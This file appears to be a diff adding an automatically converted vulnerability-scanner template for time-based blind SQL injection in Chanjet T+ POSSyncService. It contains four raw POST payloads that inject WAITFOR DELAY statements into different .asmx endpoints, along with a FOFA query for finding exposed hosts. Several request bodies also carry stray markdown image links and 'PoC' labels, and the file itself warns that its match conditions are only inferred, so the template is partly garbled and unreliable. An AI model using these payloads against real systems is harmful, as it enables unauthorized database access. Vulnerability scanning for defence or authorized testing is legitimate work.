@@ -1,0 +1,102 @@
+id: poc-xhsx0yaw85zbupav
+info:
+  name: 畅捷通T+ POSSyncService 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xhsx0yaw85zbupav
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xhsx0yaw85zbupav
+    fofa: app="畅捷通-TPlus"
+http:
+- raw:
+  - 'POST /tplus/POSSyncService.asmx/ue_itemchanged HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: length
+
+
+    accNum=1&item=member_cardcode&value=1&iddepartment=1&wheresql=;WAITFOR DELAY ''0:0:5''--
+
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1788182733417-d457a8ac-d530-4544-a9e1-1ac004bd116d.png)
+
+
+    PoC-2'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
+- raw:
+  - 'POST /tplus/POSSyncService.asmx/QueryRetailVoucher HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: length
+
+
+    accNum=1&posNum=1&key=qwe&idStore=1&retailCode=1'';WAITFOR DELAY ''0:0:5''--
+
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1788182733901-05bc8b17-0a15-4b1d-a46f-6fd65b81db8d.png)
+
+    PoC-3'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
+- raw:
+  - 'POST /tplus/POSSyncService.asmx/GetPosMemberStorageAll HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: length
+
+
+    accNum=1&poscode=1&shiftCode=1&dailyCode=1'';WAITFOR DELAY ''0:0:5''--
+
+
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1788182734318-59e36a7f-4154-466c-bf7c-3802671f1ea3.png)
+
+    PoC-4'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
+- raw:
+  - 'POST /tplus/POSSyncService.asmx/OfflineSend HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: length
+
+
+    accNum=1&ladingCode=1&idstore=1&posCode=1&dstOrderCode=1'';WAITFOR DELAY ''0:0:5''--
+
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1788182734649-aa51a01e-4325-4113-85c4-0d9e379cdd44.png)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
